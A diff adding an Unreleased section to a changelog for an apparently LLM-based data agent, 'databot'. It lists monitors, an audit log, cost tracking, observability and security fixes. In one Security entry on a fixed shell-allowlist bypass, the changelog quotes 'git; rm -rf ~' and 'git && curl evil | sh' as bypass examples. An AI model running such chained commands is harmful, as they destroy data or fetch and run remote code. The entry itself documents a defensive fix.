@@ -7,6 +7,59 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added — Operations & governance
+- **Scheduled data monitors** (`databot.monitors`, `monitor` tool) — thresholded checks (row_count, null_rate, or custom sql_metric) run on a cron schedule; when `value <operator> threshold` is met, an alert is pushed to a channel. Run history is persisted; `MonitorService` runs in the gateway alongside cron; status at `GET /api/v1/monitors`.
+- **Audit log** (`databot.audit`) — append-only record of every tool execution (tool, redacted args, status, duration) hooked into `ToolRegistry.execute`; `GET /api/v1/audit`, toggled by `security.audit_log`.
+- **Export tool** (`export_query`) — run a read-only query and write rows to CSV/JSON in the workspace (filename sandboxed).
+- **Slash commands** (`databot.core.slash`) — deterministic chat ops with no LLM round-trip: `/help`, `/clear`, `/usage`, `/tools`, `/skills`, `/status`. Handled at the agent-loop chokepoint, so they work on every channel (and the multi-agent path).
+- **Saved query library** (`databot.queries`, `saved_query` tool) — save named queries with `{param}` placeholders and run them by name; parameters are rendered as escaped SQL literals (quotes doubled, backslashes/null bytes rejected so escaping holds on MySQL/ClickHouse/Hive too). `GET /api/v1/queries`.
+
+### Changed
+- `_build_components` now returns a 14-tuple (adds the slash-command handler).
+- New skills: `visualization`, `monitoring` (default-enabled); `dbt`. `sql_analytics` gains `text_to_sql`, `describe_schema`, `profile_data`, `export_query`, `saved_query`.
+
+### Added — Channels & testing
+- **WhatsApp webhook signature verification** — the `/webhooks/whatsapp` POST handler now verifies Meta's `X-Hub-Signature-256` (HMAC-SHA256 of the raw body keyed by `app_secret`); enforced when `app_secret` is set, skipped otherwise for back-compat.
+- **Real-database smoke test** (`tests/test_smoke_sqlite.py`) — exercises the SQL connector + new tools (query, read-only enforcement, schema introspection, profiling, export, saved query, monitor, data quality, NL-to-SQL grounding, audit) against an actual SQLite file, not mocks.
+
+### Fixed
+- **CI lint** — `ruff check`/`ruff format` now pass cleanly across `databot/`.
+- **SQLite/DuckDB connection URL** — the SQLAlchemy URL builder emitted `sqlite://localhost//path` (invalid); file-based engines now build `sqlite:///path` correctly. Caught by a new real-database smoke test (`tests/test_smoke_sqlite.py`).
+- **SQLite schema introspection** — `list_tables`/`get_schema` used `information_schema` (absent in SQLite); SQLite now uses `sqlite_master` and `pragma_table_info` aliased to the same `(column_name, data_type, is_nullable)` shape as other engines, so it works as an advertised driver and feeds `text_to_sql` correctly.
+- **Saved-query parameter escaping on MySQL** — value substitution doubled quotes but not backslashes; on MySQL/ClickHouse/Hive a backslash escapes the next char inside a string literal, allowing breakout. Backslashes and null bytes in string parameters are now rejected, keeping escaping safe across engines.
+
+### Security
+- **SQL identifier injection fixed** — `SQLConnector.list_tables`/`get_schema` interpolated LLM-supplied `database`/`schema`/`table` names directly into queries (and bypassed the read-only check). All identifiers now route through a centralized, strict validator/quoter (`databot.connectors.identifiers`). The data-quality tool's local validator was consolidated into the same module.
+- **Shell allowlist bypass fixed** — `ShellTool` ran the full command string through a shell, so an allowlisted `git` allowed `git; rm -rf ~` / `git && curl evil | sh`. When an allowlist is configured, commands are now executed via `argv` (no shell) and shell metacharacters are rejected.
+
+### Added — Context & cost intelligence
+- **Token budgeting** (`databot.core.tokens`) — every LLM request is trimmed to fit the model's context window (litellm-aware with a heuristic fallback), preserving system messages and never orphaning tool results.
+- **Conversation compaction** (`databot.core.compaction`) — old turns are summarized into a running brief instead of being silently dropped; the summary persists on the session and is injected as a system message.
+- **Anthropic prompt caching** (`databot.providers.caching`) — the stable system prompt + tool definitions carry `cache_control` breakpoints, cutting cost/latency on multi-turn conversations. No-op for non-Anthropic models.
+- **LLM cost tracking & budgets** (`databot.core.cost`) — per-session and global token/dollar accounting (litellm pricing with a static fallback) plus an optional `agent.session_cost_budget_usd` cap enforced before each turn. Exposed at `GET /api/v1/usage` and in `/api/v1/stats`.
+
+### Added — Production observability
+- **Prometheus metrics** (`databot.observability.metrics`) — `/metrics` endpoint with message/tool/LLM counters, latency histograms, and cost/error totals. Graceful no-op when `prometheus_client` is absent.
+- **Readiness/liveness probes** — `GET /livez` (process up) and `GET /readyz` (returns 503 when a connector is unreachable) for Kubernetes-style orchestration.
+
+### Added — Data capabilities
+- **Data profiling tool** (`profile_data`) — per-column null rate, distinct count, and min/max for a table, with automatic column discovery and data-quality flagging (high-null, constant, all-null columns). Part of the `sql_analytics` skill.
+- **NL-to-SQL tool** (`text_to_sql`) — generates a read-only SQL query from a natural-language question, grounded in the connection's real schema (tables + columns via hardened introspection), validated read-only before it is ever returned or executed; optional execution.
+- **Schema introspection tool** (`describe_schema`) — exposes list-databases/list-tables/describe-table to the agent (connector-backed, with an `information_schema` fallback).
+- **Chart tool** (`chart`) — renders bar/line/sparkline charts as Unicode text that displays in any channel; new default-enabled `visualization` skill.
+- **dbt tool** (`dbt`) — parses `manifest.json` to list/describe models, trace upstream/downstream lineage, and inspect tests and sources; new `dbt` skill and `tools.dbt` config.
+
+### Changed — Intelligence
+- **Multi-agent path is now session-aware** — the delegator loads conversation history, compacts old turns into a running summary (injected as a system message), and persists each turn. Previously multi-agent mode had no memory and no compaction.
+- **Multi-agent path now cost-aware** — the delegator/router/specialists record per-session token usage + cost, fit each request to the context window, and enforce the per-session budget (previously single-agent only).
+- **Centralized usage recording** — a shared `core.cost.record_llm_usage` is used by the agent loop, multi-agent specialists/router, and the `text_to_sql` tool, so no LLM call's cost is silently dropped.
+- **RAG relevance threshold** — `rag.max_distance` drops weakly-related documents so irrelevant context is never injected (0 disables).
+
+### Changed
+- `agent` config gains `prompt_caching`, `context_budget_ratio`, `compaction_*`, and `session_cost_budget_usd`; `observability` gains `metrics_enabled`.
+- `_build_components` now returns a 13-tuple (adds the usage tracker and compactor); `_register_tools` takes the provider for NL-to-SQL.
+- ~98 new tests (386 total, 10 skipped) covering identifier safety, shell hardening, token budgeting, cost/budgets, prompt caching (+fail-safe), compaction, metrics, profiling, NL-to-SQL, schema introspection, charts, multi-agent cost wiring, RAG threshold, and dbt.
+
 ## [0.3.0] - 2026-02-11
 
 ### Added
